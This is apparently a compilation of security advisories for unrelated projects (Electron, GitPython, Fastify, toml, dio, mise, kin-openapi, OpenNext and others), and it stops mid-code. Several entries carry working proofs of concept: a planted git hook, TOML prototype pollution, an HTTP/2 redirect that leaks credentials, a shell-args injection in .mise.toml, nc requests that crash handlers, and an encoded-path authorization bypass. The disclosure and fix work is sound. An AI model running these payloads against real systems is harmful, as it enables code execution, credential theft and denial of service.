### Impact
`chrome.tabs.query()` returned each tab's `url` and `title` to extensions that held neither the `tabs` permission nor matching host permissions, so any loaded extension could read the URL and title of every webContents in its session.

Apps are only affected if they load extensions (`session.extensions.loadExtension`) that they do not fully trust. Apps that load no extensions, or only trusted ones, are not affected.

### Workarounds
Do not load untrusted or unvalidated extensions. In general you should only load trusted extensions.

### Fixed Versions
* `45.0.0-alpha.4`
* `44.1.1`
* `43.5.1`
* `42.11.1`

### For more information
If you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)

### Impact
Frame data received from the GPU process for `webContents.beginFrameSubscription` was not fully validated by the main process. A compromised GPU process could cause the main process to read out-of-bounds memory while producing the captured frame images, disclosing memory or crashing the app.

Apps are only affected if they use `webContents.beginFrameSubscription` and an attacker has separately gained code execution in the GPU process. Apps that do not subscribe to captured frames are not affected.

### Workarounds
There are no app side workarounds, you must update to a patched version of Electron.

### Fixed Versions
* `45.0.0-alpha.9`
* `44.4.3`
* `43.7.3`
* `42.11.6`

### For more information
If you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)

### Impact
In offscreen rendering mode on macOS, frame data received from the GPU process was not fully validated by the main process. Apps are only affected if they use offscreen rendering (`webPreferences.offscreen`) on macOS and an attacker has separately gained code execution in the GPU process. Apps that do not use offscreen rendering are not affected.

### Impact
Requests to open external protocol URLs could be attributed to a document other than the one that asked for them, so the `requestingUrl` passed to `session.setPermissionRequestHandler` was a trusted origin for a launch untrusted content had requested. An origin-based handler could therefore let untrusted content launch an OS-registered external application.

Apps are only affected if they grant `openExternal` based on the requesting origin and let untrusted content open or navigate windows. Apps whose permission handler denies `openExternal` for untrusted content are not affected.

### Workarounds
Deny the `openExternal` permission for untrusted content, or deny the windows it opens with `setWindowOpenHandler`.

### Fixed Versions

* `44.3.0`
* `43.7.0`
* `42.11.3`

### Summary

`create_submodule(name, path, url)` clones a submodule into the repo's own `.git`
directory before it rejects the path. A `path` of ".git/hooks" is accepted by the
pre-clone check, so the submodule is cloned straight into the live hooks directory,
and a file named `post-checkout` in the submodule becomes an executable
`.git/hooks/post-checkout`. On 3.2.0+ the later index check does raise `ValueError`,
but only after the clone already wrote to disk, and it does not remove the planted
hook; on 3.1.x there is no such check and the call succeeds silently. Either way the
hook runs on the next git operation (e.g. checkout), giving code execution.

### Details

The checkout path is validated too late, after the clone has already mutated disk.
This breaks the "validate before mutation" invariant that commit 43a43cd8 ("Validate
submodule checkout and metadata paths before mutation") set out to enforce.

Submodule.add() calls the permissive path check before cloning, and the strict check
only reaches the ".git" alias at index time, after _clone_repo has written to disk:

git/objects/submodule/base.py (Submodule.add)
  599: path = cls._to_relative_path(repo, path)           # accepts ".git/hooks"
  673: mrepo = cls._clone_repo(repo, url, path, name, ...) # clones into <worktree>/.git/hooks
  714: index.add([sm], write=True)                         # strict check only triggers here

git/index/base.py (IndexFile._preprocess_add_items)
  732: _validate_repo_path(entry.path)                     # rejects ".git", too late

_to_relative_path only blocks `..`/absolute/out-of-tree paths; `.git` aliases are
rejected only by _validate_repo_path, which was added in 3.2.0 (commit a75aedf3) and
runs at the index boundary. The ValueError it raises at line 732 does not roll back
what _clone_repo already wrote.

Version-dependent behavior:
- 3.2.0 .. tip bda18e08: _validate_repo_path raises ValueError at index.add, but the
  hook is already on disk and is not removed (incorrect order of validation vs. clone).
- 3.1.x (e.g. 3.1.59): _validate_repo_path does not exist and _to_relative_path does
  not reject `.git`; create_submodule(path=".git/hooks", ...) returns with no error at
  all and the hook is planted silently.

### Proof of concept

Setup:
  evilsub/ : a git repo whose ROOT contains an executable file named post-checkout (the payload)
  victim/  : a git repo with at least 1 commit and a second branch, whose .git/hooks has NO
             sample hooks (the state of a minimal/CI checkout, or `git init` with an empty
             template dir, or GIT_TEMPLATE_DIR/init.templateDir empty)

import git, os.path as osp
try:
    git.Repo("victim").create_submodule(name="x", path=".git/hooks", url=osp.abspath("evilsub"))
except ValueError:
    pass   # 3.2.0+: ".git" is rejected, but only AFTER the clone, so the plant already happened.
           # 3.1.x: no exception is raised at all; the call succeeds and still plants the hook.

#### victim/.git/hooks/post-checkout now exists, mode 0755, attacker-controlled, on every
#### affected version. Any later checkout runs it:
####  git -C victim checkout <other-branch>   ->   the hook runs   ->   code execution

Verified live:
- tip bda18e08 (3.2.0 + 3 commits): create_submodule raised ValueError from
  git/index/base.py:732, yet .git/hooks/post-checkout was present and executable, and
  `git checkout` executed it.
- 3.1.59: create_submodule returned with no error; .git/hooks/post-checkout was planted
  and executed by `git checkout`.

### Impact

Arbitrary code execution. A library/app that creates a submodule from an
attacker-influenced `path` ends up with an attacker-controlled executable in
`.git/hooks`, which git runs on ordinary later operations. This affects any service
that derives a submodule checkout path from untrusted data, e.g. one that ingests a
submodule spec (name/path/url) from a user-supplied manifest or API request and feeds
`path` into create_submodule. On 3.2.0+ the library's own validation is the thing that
fails: it correctly rejects the `.git` path, but only after the submodule has already
been cloned into place, so an app that traps the ValueError reasonably believes the
unsafe path was blocked.

Preconditions (hence AC:H): (1) the app passes an attacker-influenced submodule `path`;
(2) the target hook name is free in `.git/hooks`, true for minimal/CI/container
checkouts and whenever init.templateDir/GIT_TEMPLATE_DIR is empty. With the default
sample hooks present, `git clone` refuses the non-empty destination and no plant occurs.

Affected: all tested versions from 3.1.x (3.1.59) through the current tip bda18e08
(3.2.0 + 3 commits). 3.1.x plants silently; 3.2.0+ plants despite raising ValueError.

### Impact

Fastify lowercases header names in a `headers` schema before compilation, because Node.js stores request header names in lowercase. This normalization does not reach the header names held in a `propertyNames` subschema's `enum` and `const`. A header-name deny-list written in the canonical header case, such as `propertyNames: { not: { enum: ['X-Debug-Override'] } }`, therefore never matches the lowercased request headers, and the forbidden header reaches the handler. Any application that uses a `propertyNames` deny-list or allow-list to constrain request header names does not get the constraint it expects. The same rule written in lowercase works, and the `not: { required: [...] }` form is unaffected, so this is a gap in the built-in normalization rather than a wrong schema. This is an incomplete fix of CVE-2026-84428 ([GHSA-9q9j-q6p8-xq58](https://github.com/fastify/fastify/security/advisories/GHSA-9q9j-q6p8-xq58)), whose normalization covered header names used as property keys but not those used as values inside `propertyNames`.

### Patches

Users should upgrade to fastify `5.12.6` or later, which lowercases header names held in `enum` and `const` inside a `propertyNames` subschema so they match the lowercased request headers. Header-name constraints that cannot be normalized automatically, regular expressions (`propertyNames` `pattern` and `patternProperties` keys) and a `$ref` used inside `propertyNames`, are documented and, for the `$ref` case, warned at startup (`FSTSEC003`). Author those to match the lowercased request headers.

### Workarounds

Write the `propertyNames` header-name constraint in lowercase (for example `enum: ['x-debug-override']`), or enforce the header check in an `onRequest` or `preValidation` hook instead of the schema.

### Summary
CVE-2026-63376 described prototype pollution through __proto__ key-path desynchronization and was fixed in 4.1.2 by rewriting the path bookkeeping and adding an ownedContainers WeakSet. The desynchronization is still reachable, spelled with a quote character instead of a dot, and the owned-container check is not applied on the path that matters.

A four-line TOML document parsed with toml.parse() writes a property onto Object.prototype, where it is visible to every object in the process — including objects produced by unrelated libraries.

### Details
Three gaps compose. All line numbers are `lib/compiler.js` in 5.0.0.

**1. The path-key encoding is ambiguous.** `quoteDottedString()` quotes a segment only when it contains a `.`, and never escapes a `"` inside the segment:

```js
287:  function quoteDottedString(str) {
288:    if (str.indexOf(".") > -1) {
289:      return "\"" + str + "\"";
290:    } else {
291:      return str;
292:    }
293:  }
```

So the key path `['x.y']` and the key path `['"x', 'y"']` both render as the string `"x.y"`. This is the same desynchronization CVE-2026-63376 named, with a quote in place of the dot.

**2. A table-array header can clear another key's guard.** `addTableArray()` walks `assignedPaths` / `valueAssignments` with `isSameOrSubPath()` over those ambiguous strings, so a header whose rendered path collides with an unrelated key deletes that key's entry.

**3. The descent in `assign()` has no owned-container check.** `deepRef()` applies `isOwnedContainer()` only to intermediate segments (`lib/compiler.js:265`, `:273`) and returns the final container unchecked. `assign()` then walks it with only a shape test:

```js
 93:      target = target[k];
...
103:    target[lastKey] = reduced;
```

A TOML datetime is a `Date`. It satisfies `typeof target[k] === "object"` and is not an array, so the walk descends into it — and a `Date` has a live prototype chain to `Object.prototype`.

Putting the three together, a document can make the current table a `Date` and then walk `__proto__.__proto__` to `Object.prototype`.

```bash
mkdir poc && cd poc && npm init -y >/dev/null && npm install toml@5.0.0
```

```toml
# poc.toml
"b.c" = 1979-05-27T07:32:00Z
[['"b']]
["b.c"]
__proto__.__proto__.polluted = "yes"
```

Line 1 defines a key whose rendered path is `"b.c"` and whose value is a `Date`.
Line 2 is a table-array header whose rendered path collides with it, clearing its guard.
Line 3 re-enters that key, so the current table is now the `Date`.
Line 4 walks `Date` → `Date.prototype` → `Object.prototype`.

```js
// poc.js
const toml = require('toml');
const fs = require('fs');

console.log('before:', JSON.stringify(({}).polluted));
toml.parse(fs.readFileSync('poc.toml', 'utf8'));
console.log('after: ', JSON.stringify(({}).polluted));
console.log('Object.prototype.hasOwnProperty("polluted") =', Object.prototype.hasOwnProperty('polluted'));
console.log('JSON.parse("{}").polluted =', JSON.stringify(JSON.parse('{}').polluted));
```

```
$ node poc.js
before: undefined
after:  "yes"
Object.prototype.hasOwnProperty("polluted") = true
JSON.parse("{}").polluted = "yes"
```

The payload sets a single harmless marker property. The last line shows the property is visible on an object this code never touched.

A useful control: the same document without line 2 (the guard-clearing header) is correctly rejected on 4.1.2 and later, which confirms the clearing step is what is load-bearing.

### Impact

Any application that parses a TOML document from an untrusted source is affected — a configuration file uploaded by a user, a manifest from a third-party package or repository, a document posted to an API. Prototype pollution of this kind commonly escalates to authentication or authorization bypass, denial of service, and in applications with a suitable gadget, remote code execution, because every object in the process inherits the injected property.

Suggested fix: in `assign()`, apply the same check the intermediate descent already uses — after `target = target[k]`, reject when `!isOwnedContainer(target)`. Equivalently, apply `isOwnedContainer` to the value `deepRef()` returns. Separately, `quoteDottedString()` should escape `"` inside a segment so that distinct key paths cannot render to the same string.

## Impact

The OpenAI Chat Model node checked a custom base URL against the credential's allowed-domains configuration before sending a request, but the model-search dropdown did not. A request setting `options.baseURL` on that path reached an arbitrary host with the credential attached, so the domain restriction an administrator configured did not hold for every route the node offered. The patch routes every OpenAI call site, including model listing, through one shared allowed-domains check.

## Patches

The issue has been fixed in n8n versions 1.123.76, 2.37.7, and 2.38.2. Users should upgrade to one of these versions or later to remediate the vulnerability.

## Workarounds

If upgrading is not immediately possible, administrators should consider the following temporary mitigations:
- Restrict n8n instance access to fully trusted users only.
- Audit all domain-restricted `openAiApi` credentials and revoke use-only shares granted to untrusted users.
- Rotate any `openAiApi` credential secrets that may have been exposed and review downstream OpenAI account activity for unexpected usage.

These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.

### Summary

`dio_http2_adapter` follows HTTP `Location` redirects without stripping sensitive request headers when the redirect target is a different origin. An attacker who can cause any origin server to return a cross-origin `302` redirect receives the victim's `Authorization`, `Cookie`, and `Proxy-Authorization` headers verbatim. This vulnerability has a CVSS v3.1 base score of **7.5 (High)** because `followRedirects` is enabled by default, no authentication is required to exploit it, and the confidentiality impact is high.

### Details

When `Dio` is configured to use `Http2Adapter`, the adapter's internal `_fetch` method constructs HTTP/2 request headers by unconditionally copying all entries from `options.headers`:

```dart
// plugins/http2_adapter/lib/src/http2_adapter.dart:111
headers.addAll(
  options.headers.entries.map((entry) {
    ...
    return Header.ascii(entry.key.toLowerCase(), v);
  }).toList(),
);
```

On receiving a `3xx` response, the adapter reads the `Location` header and resolves the redirect target URI:

```dart
// plugins/http2_adapter/lib/src/http2_adapter.dart:254-263
final url = responseHeaders.value('location');
final uri = Uri.parse(url ?? '');
final String path = resolveRedirectUri(options.uri, uri).toString();
return _fetch(options.copyWith(path: path, maxRedirects: --options.maxRedirects), ...);
```

`options.copyWith` is called without an explicit `headers` argument; `dio/lib/src/options.dart:629` therefore preserves the full original header map via `headers ?? Map.from(this.headers)`. `resolveRedirectUri` (`http2_adapter.dart:290`) returns an attacker-controlled cross-origin URI without any origin comparison. The combination means that on every redirect, the full set of original sensitive headers — including `Authorization`, `Cookie`, and `Proxy-Authorization` — is forwarded to the new authority with no sanitization.

**Data flow (source → sink):**

1. `dio/lib/src/dio_mixin.dart:383` — public `Dio.request<T>(String path, ...)` entry point.
2. `dio/lib/src/options.dart:331` — base and per-request headers merged into `RequestOptions`.
3. `dio/lib/src/dio_mixin.dart:596` — `httpClientAdapter.fetch(reqOpt, ...)` dispatches to `Http2Adapter`.
4. `plugins/http2_adapter/lib/src/http2_adapter.dart:254` — `Location` header is read from the network response (attacker-controlled source).
5. `plugins/http2_adapter/lib/src/http2_adapter.dart:258` — redirect target URI resolved; cross-origin check absent.
6. `plugins/http2_adapter/lib/src/http2_adapter.dart:260` — `options.copyWith(path: path, ...)` called without `headers` override.
7. `dio/lib/src/options.dart:629` — `copyWith` preserves `Map.from(this.headers)` — all sensitive headers retained.

### PoC

The following steps reproduce the vulnerability using two local HTTP/2 cleartext (h2c) servers inside an isolated Docker container (no external network required).

**Prerequisites:**

- Docker installed and accessible.
- Repository checked out at the path used as the build context.

**Build and run:**

```bash
# From the repository root (github_web_81_cfug__dio/)
docker build -f vuln-001/Dockerfile -t dio-vuln-001:poc .
docker run --rm --network none dio-vuln-001:poc
```

**What the container does:**

1. Starts an *origin* h2c server on `127.0.0.1:18081` that immediately returns `302 Location: http://127.0.0.1:18082/capture`.
2. Starts an *attacker* h2c server on `127.0.0.1:18082` that logs every received header.
3. Executes the following Dart exploit:

```dart
final dio = Dio()
  ..httpClientAdapter = Http2Adapter(ConnectionManager());
await dio.get(
  'http://127.0.0.1:18081/start',
  options: Options(headers: {
    'Authorization': 'Bearer SECRET_TOKEN_12345',
    'Cookie': 'sid=SECRET_SESSION_ABC',
    'x-secret': 'internal-secret-value',
  }),
);
```

**Expected output (confirms vulnerability):**

```
RESULT=VULN_CONFIRMED
LEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345
LEAKED_COOKIE=sid=SECRET_SESSION_ABC

[ATTACKER] Received headers:
[ATTACKER]   authorization: Bearer SECRET_TOKEN_12345
[ATTACKER]   cookie: sid=SECRET_SESSION_ABC
[ATTACKER]   x-secret: internal-secret-value
```

The attacker server at `127.0.0.1:18082` receives all three sensitive headers, demonstrating that `Http2Adapter` forwards them verbatim across the cross-origin redirect with no stripping.

### Impact

This is a **sensitive information disclosure** vulnerability. Any application that:

1. configures `Dio` with `Http2Adapter`, and
2. sends requests carrying `Authorization`, `Cookie`, or `Proxy-Authorization` headers,

is affected. Because `followRedirects` defaults to `true` and `maxRedirects` defaults to `5`, no additional configuration is needed to trigger the bug.

An attacker who controls — or can compromise — any HTTP server that the victim application contacts can issue a `302` redirect to an attacker-owned server and thereby capture the victim's bearer tokens, session cookies, or proxy credentials. The attack requires no prior authentication and is executable over the network with low complexity. Stolen credentials may then be used to impersonate the victim against the original service or any other service that accepts the same token.

Affected parties include server-side Dart/Flutter applications and CLI tools that make authenticated HTTP/2 requests through `dio_http2_adapter`.

An attacker can: - read cluster topology and control-plane metadata - allocate IDs and timestamps - invoke destructive membership actions - disrupt the Zero control plane - indirectly destabilize Alpha nodes that depend on Zero connectivity This is a high-value unauthenticated administrative exposure and, in the reproduced case, a practical denial of service against the control plane.

### Impact
An M4A file containing a sub-atom with a size of zero in the `----` atom makes the parser enter an infinite loop, resulting in a denial-of-service for programs reading such files with tinytag.

### Patches
The issue has been fixed in tinytag 2.3.0, by reusing the primary atom parsing code path that contains appropriate size checks.

### Workarounds
No workarounds exist. Users must upgrade to tinytag 2.3.0.

The FTP and FTPS server -- if enabled -- would allow uploading to any folder that the copyparty process had permission to write to.

The FTP-server is default-disabled, and must be explicitly enabled in the config with global-option `ftp` or `ftps` to be affected. Additionally, SFTP was not affected at all; only FTP and FTPS.

This was not a full read/write path-traversal; it had the following limitations:
* Only applied to uploads; it was not possible to read/download existing files in this manner.
* The output filename was not fully controllable; a randomized suffix would always be appended to the filename.
* Existing files could not be overwritten or appended to; only new files could be created.
* Filesystem-permissions would prevent writing to system folders, as copyparty surely does not run as root in most deployments.
* Copyparty itself will not execute arbitrary files as code by default, so this vulnerability could not be used to execute arbitrary code through copyparty.

The main concern is the potential effect on other unrelated software which is running on the same system.

The severity is assuming the worst case (SC:H/SI:H), that the same machine is running some unrelated software that will execute new arbitrarily-named files as code, and that the copyparty process has sufficient privileges to write files into the config-folder of that unrelated software.

## Summary

Untrusted local .mise.toml [settings] can set the shell interpreter args (unix/windows default_inline / default_file shell_args), yielding arbitrary command execution, because those command-interpreter settings were not added to the global_only denylist the CVE-2026-55448 fix relies on. Code execution from an untrusted repository with no trust prompt for the malicious file, on par with the patched CVE. Confirmed at HEAD 7160170206782fdd3ef287c8302369e32152fb71.

## The defect

CVE-2026-55448 and CVE-2026-35533 fixed the fact that a local project [settings] table is harvested by the settings preloader independent of the trust store (an untrusted .mise.toml sets settings without the user ever trusting it). The remediation is a per-field global_only denylist: settings marked global_only are stripped from non-global config. The maintainers marked the command-execution fields they knew about (the three forge credential_command values) but did not mark the four shell-interpreter-args settings, which are also command-execution settings because they choose the interpreter for every command mise spawns.

The global_only denylist and the gap. In settings.toml, the three credential_command sinks are global_only (forgejo.credential_command around line 775, github.credential_command around 828, gitlab.credential_command around 990). The four shell-args settings do not carry global_only:

- unix_default_file_shell_args (settings.toml around 2920)
- unix_default_inline_shell_args (around 2926)
- windows_default_file_shell_args (around 3004)
- windows_default_inline_shell_args (around 3010)

The strip logic only removes global_only keys. src/config/settings.rs strip_local_only_settings (line 409) filters by meta.global_only (line 416: `filter_map(|(key, meta)| meta.global_only.then_some(*key))`), so any field not marked global_only survives from a local untrusted config. The settings preload loads every config path including the local project file (all_settings_files, line 778), and in default (non-safe) mode there is no trust check (safe_mode defaults false, line 1141).

The sink. src/config/settings.rs default_inline_shell (line 1032) reads self.unix_default_inline_shell_args (line 1040), and default_file_shell reads unix_default_file_shell_args. Settings::get returns the merged global-plus-local value minus global_only, so the untrusted project value overrides the built-in default (sh -c -o errexit).

Injection semantics. The real command is appended after the attacker's args, so PAYLOAD runs and the real command is demoted to $0:

- tera inline exec builtin: src/tera.rs (tera1_exec around 1358, and around 1470) builds shell[1..] + [command] with program = shell[0]. An attacker unix_default_inline_shell_args = "sh -c 'PAYLOAD'" yields sh -c 'PAYLOAD' <command>.
- postinstall runner: src/backend/mod.rs around 2405 calls cmd_body_args(shell_args, body); src/cmd.rs cmd_body_args (non-Windows, around 520) returns program flags... body, the same demotion.
- task execution: src/task/task_executor.rs (around 916, 939, 993) uses task.shell()?.unwrap_or(default_inline_shell()/default_file_shell()), so a trusted task with no explicit shell (the common case) runs through the attacker's interpreter.
- hooks: src/hooks.rs (around 540, 603) also fall back to default_inline_shell().

## Attacker model and reachability

An untrusted repository the developer clones and cd's into. The attacker's .mise.toml sits in the working directory or any ancestor and is never trusted by the victim; its [settings] table is harvested by the preloader independent of the trust store, exactly as the two prior CVEs established. The executed command can come from a trusted or global source; only the interpreter is attacker-controlled. Any of these, run while the untrusted .mise.toml is in an ancestor directory, fires it: mise run <task> for a task defined in the global config or a trusted parent repo (inline run, no explicit shell); mise install of any tool with a postinstall directive; any tera template that calls exec(...) in the victim's own trusted or global config; a directory-enter hook from any trusted config in scope.

Proof of concept. In an untrusted repo, .mise.toml:

```toml
[settings]
unix_default_inline_shell_args = "sh -c 'id > /tmp/mise_pwned'"
```

The victim cd's in (does not trust the file) and later runs any global or trusted-parent task with no explicit shell, or mise install of a tool with a postinstall, or a config that renders {{ exec(...) }}. mise builds `sh -c 'id > /tmp/mise_pwned' <realcommand>`, so the payload runs.

## Verification

Source-verified at HEAD: the four shell-args settings lack global_only while the credential_command sinks have it, strip_local_only_settings removes only global_only keys, default_inline_shell reads the setting, and the exec/postinstall/task paths append the real command after the attacker args. The load path is the same one two shipped CVEs already proved reachable. I did not run mise end to end.

## Suggested fix

Mark all four *_default_*_shell_args settings global_only = true (the same treatment as credential_command), or flip the default-mode policy to an allowlist so any setting not explicitly known-safe is stripped from non-global config.

Secondary note (weaker, not the main finding): the CVE-2026-54557 path-sanitization fix added sanitize_install_version_name only inside the HTTP backend (src/backend/http.rs around 628), while the general path builder ToolVersion::tv_pathname (src/toolset/tool_version.rs around 292) still only replaces ':' and '/' and does not neutralize '..' or backslash. Impact is narrow (one level up, stays in the mise data dir on Unix), so this is a hardening note, not a primary finding.

## Tooling

AI assistance was used while investigating, but the researcher read strip_local_only_settings (confirming it strips only global_only), the settings.toml entries (confirming the four shell-args settings lack global_only while credential_command has it), default_inline_shell (confirming it reads the setting), and the exec/postinstall/task invocation sites (confirming the real command is appended after the attacker args) themself at HEAD, so the incomplete fix is source-verified.

## Summary
The `openapi3filter.ValidationHandler` (the exported, documented request-validation middleware) hard-wires the legacy router (`routers/legacy`). That router matches the incoming request method verbatim against a trie built exclusively from upper-cased canonical HTTP methods. A request carrying a method token that is not one of the 9 standard methods — a legitimate-but-unsupported token such as `PROPFIND`, or a non-canonical case variant such as lowercase `get` — misses the trie, leaves `route == nil`, and for an existing **static** path falls through to `PathItem.GetOperation(method)`, whose `default:` case calls `panic(...)`. The panic fires inside route resolution, **before any authentication** runs. This is an unauthenticated, remotely triggerable denial of service (recovered per-connection panic + unbounded error-log growth).

## Root Cause
- `openapi3filter/validation_handler.go:39` — `ValidationHandler.Load()` always constructs `legacyrouter.NewRouter(doc)`; there is no alternative router option on this path.
- `routers/legacy/router.go:109` — the request method is used verbatim (`method, url := req.Method, ...`); there is no canonicalization or rejection of unknown method tokens.
- `routers/legacy/router.go:69-70` — the trie is populated with `strings.ToUpper(method)` keys taken from `pathItem.Operations()` (canonical `http.Method*` constants only).
- `routers/legacy/router.go:141` — `root.Match(method + " " + remainingPath)` misses for a non-canonical/unsupported method → `route == nil`.
- `routers/legacy/router.go:146-150` — in the `route == nil` block, `doc.Paths.Value(path)` returns non-nil for an existing static path, and control reaches `pathItem.GetOperation(method)`.
- `openapi3/path_item.go:174` — `GetOperation`'s `switch method` has no matching case → `default: panic(fmt.Errorf("unsupported HTTP method %q", method))`.

## Impact
An unauthenticated attacker sends a single request with a non-standard HTTP method token to any existing static path. The handler goroutine panics; Go's `net/http` recovers the panic per connection (process survives), aborts the connection (client sees a reset / 500), and logs a full stack trace. Repeated requests cause connection churn and unbounded `http: panic serving` log growth, and the request never reaches authentication. Availability impact (A:L) under the default synchronous `ValidationHandler` middleware; on non-net/http hosts or when reached on an application goroutine the ceiling is a full crash.

## Proof of Concept
Serve any spec with a static path (e.g. `/ping`) behind `openapi3filter.ValidationHandler`, then:
```
printf 'PROPFIND /ping HTTP/1.1\r\nHost: x\r\n\r\n' | nc target 8080   # connection aborted (panic)
printf 'get /ping HTTP/1.1\r\nHost: x\r\n\r\n'      | nc target 8080   # connection aborted (panic)
printf 'GET /ping HTTP/1.1\r\nHost: x\r\n\r\n'      | nc target 8080   # 200 OK (process survived)
```
Reproduced end-to-end against a real `net/http.Server` + `ValidationHandler`: `PROPFIND /ping` and lowercase `get /ping` both abort the connection with a panic at `path_item.go:174` (stack: `GetOperation` <- `legacy.FindRoute` router.go:150 <- `ValidationHandler.validateRequest` validation_handler.go:84); the process stays alive and subsequent `GET /ping` returns 200.

## Attack Chain
1. Entry: unauthenticated `PROPFIND /ping HTTP/1.1` (any known static path). Guard: net/http method validation. Bypass proof: net/http accepts any valid HTTP token as a method — `PROPFIND` and lowercase `get` both reach the handler.
2. Route match: `legacy/router.go:141` `root.Match("PROPFIND /ping")`. Guard: trie match. Bypass proof: trie holds only upper-cased canonical methods → miss → `route == nil`.
3. `route == nil` block: `router.go:146` `doc.Paths.Value("/ping")` → non-nil for an existing static path (exact map lookup). Guard: `pathItem == nil` check (l.147). Bypass proof: static path exists → not nil → proceeds.
4. Sink: `router.go:150` `pathItem.GetOperation("PROPFIND")` → `path_item.go:174` `default: panic(...)`.
5. Impact: handler goroutine panics; net/http recovers per connection; request never reaches auth.

## Bypass Evidence
- net/http does NOT reject non-standard method tokens — confirmed empirically: `PROPFIND` and lowercase `get` both reached the handler and panicked.
- No canonicalization/rejection exists between `FindRoute` entry and `GetOperation`; `req.Method` is used verbatim (router.go:109).
- `git show v0.144.0:openapi3/path_item.go` shows `panic(...)` at line 174; `git show v0.144.0:routers/legacy/router.go` shows verbatim method use and the unguarded `GetOperation` call. `git log v0.144.0..HEAD` on these files is empty (no post-tag fix).

## Scoping Note
The panic requires the request path to be an exact static (non-templated) key in the served spec. A concrete path against a `/{id}` template returns a clean 500 (not a panic), because `Paths.Value` is an exact map lookup. Static paths (`/health`, `/login`, `/version`, `/metrics`, `/ping`, `/`) are ubiquitous in real specs and discoverable from public specs/standard endpoints, so a vulnerable target almost always exists. This makes the finding arguably broader than existing panic advisories, as it needs no special spec construct — any static path suffices.

## Affected Versions
`<= 0.144.0` (present on the latest release tag v0.144.0; long-standing; no patched version).

## Suggested Fix
In the legacy router, canonicalize/validate the request method before route resolution and return `ErrMethodNotAllowed`/`ErrPathNotFound` for unknown methods, or make `PathItem.GetOperation` return an error (nil) for unrecognized methods instead of calling `panic`.

## Summary

When cache interception is enabled, `@opennextjs/cloudflare` can interpret percent-encoded paths differently during middleware matching and cache lookup.

An encoded request may fail to match authorization middleware, then be decoded into the cache key of a protected route. The cached response may consequently be returned without invoking the middleware.

`enableCacheInterception` is disabled by default.

## Impact

A remote unauthenticated attacker may retrieve cached content from routes intended to be protected by middleware.

An application is affected when it:

- explicitly enables `enableCacheInterception`;
- relies on middleware for access control; and
- has a matching cached route.

## Details

Middleware matching previously used the encoded request pathname, while cache interception decoded the pathname before selecting a cache entry.

For example, consider an application with:

- middleware matcher `/admin/:path*`;
- middleware returning `401 Authentication required` for `/admin`;
- a statically generated, cached `/admin` route; and
- cache interception enabled:

```ts
export default defineCloudflareConfig({
  incrementalCache: staticAssetsIncrementalCache,
  enableCacheInterception: true,
});
```

An attacker can request:

```http
GET /%61dmin
```

The encoded pathname does not match `/admin/:path*`, so the authorization middleware is not invoked. Cache interception then decodes `%61dmin` to `admin` and may return the cached `/admin` response:

```http
HTTP/1.1 200 OK
x-opennext-cache: HIT

Protected content
```

Malformed paths exposed an additional inconsistency. For example:

```http
GET /%61dmin/%ZZ
```

The previous implementation decoded each segment independently. It decoded `%61dmin` to `admin` but retained the malformed `%ZZ` segment, allowing cache lookup to continue using a partially decoded pathname.

## Patches

The fix aligns encoded-path handling across middleware matching and cache lookup, and rejects malformed paths instead of partially decoding them. See the upstream fixes in [opennextjs-aws#1199](https://github.com/opennextjs/opennextjs-aws/pull/1199) and [opennextjs-aws#1200](https://github.com/opennextjs/opennextjs-aws/pull/1200).

Users should upgrade to `@opennextjs/cloudflare@1.20.2` or later.

## Workarounds

If upgrading is not immediately possible for an application:

1. Disable cache interception by removing `enableCacheInterception: true`.
2. Enforce authorization inside protected route handlers rather than relying exclusively on middleware.
3. Reject encoded paths for protected routes at a trusted proxy before they reach the Worker.

Adding individual encoded matcher variants is not a complete workaround because pathnames can have multiple equivalent encodings.

### Summary

A nil-pointer dereference in `openapi3filter` lets any unauthenticated client crash a request handler with a single HTTP request against an OpenAPI **3.1** operation that declares `type: array` **without** `items`. OpenAPI 3.1 (JSON Schema 2020-12) permits omitting `items`, and `doc.Validate()` accepts such schemas with `Schema.Items == nil`. Request/response decoders then dereference `Items` with no nil check. The panic is **deterministic (100%)** on every request to the affected operation. There is no `recover()` in `openapi3filter`; under handlers without per-request recover the process can exit.

### Details

**Spec-validation asymmetry.** OpenAPI 3.0 rejects array schemas that omit `items` ([`openapi3/schema.go`](https://github.com/getkin/kin-openapi/blob/master/openapi3/schema.go) around the `TypeArray` / `newSchemaItemsRequired` branch). For OpenAPI 3.1, `T.Validate` enables `jsonSchema2020ValidationEnabled`, so that check is skipped and `Schema.Items` remains nil after a clean `doc.Validate()`.

**Vulnerable decoder.** The primary request-side crash is in [`UrlencodedBodyDecoder`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go) (still present on this checkout at L1421):

```go
case propType.Is("array"):
    items := propSchema.Value.Items.Value  // Items == nil → panic
```

This runs during schema inspection **before** form values are parsed. Any non-empty `application/x-www-form-urlencoded` body for the operation reaches the dereference (an empty body is rejected earlier when `requestBody.required` is true, and never enters the decoder).

The same nil `Items` also crashes:

| Path | Location | Trigger |
|---|---|---|
| `MultipartBodyDecoder` | `req_resp_decoder.go` ~1564 → 1579 | `multipart/form-data` part named like the array property |
| `parseArray` → `parsePrimitive` | `req_resp_decoder.go` ~1129 / 1151 | Array-typed **response headers** via `ValidateResponse`, and path/cookie array params |

`Middleware` / `ValidationHandler` call `ValidateRequest` / `ValidateResponse` directly with no recover, so the panic escapes the library into the application.

**Recommended fix.** Guard nil `Items` and return a structured decode/validation error, e.g.:

```diff
 case propType.Is("array"):
+	if propSchema.Value.Items == nil || propSchema.Value.Items.Value == nil {
+		return nil, fmt.Errorf("unsupported schema of request body's property %q: array items required for decoding", propName)
+	}
 	items := propSchema.Value.Items.Value
```

Apply equivalent guards in `MultipartBodyDecoder` and `parseArray` before calling `parsePrimitive`.

### PoC

Verified against revision `c11a4812ba7be3ee3d81453be0c397ee84c238d5`, Go 1.25, `darwin/arm64`.

**1. Spec** — OpenAPI 3.1 operation with urlencoded body and `type: array` property without `items`:

```yaml
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
```

**2. E2E program** — `net/http` server using the same public entrypoint (`gorillamux` → `openapi3filter.ValidateRequest`) real middleware uses. Save as `main.go` in a module that depends on `github.com/getkin/kin-openapi` at a vulnerable revision, then `go run .`:

```go

	"fmt"
	"log"
	"net/http"
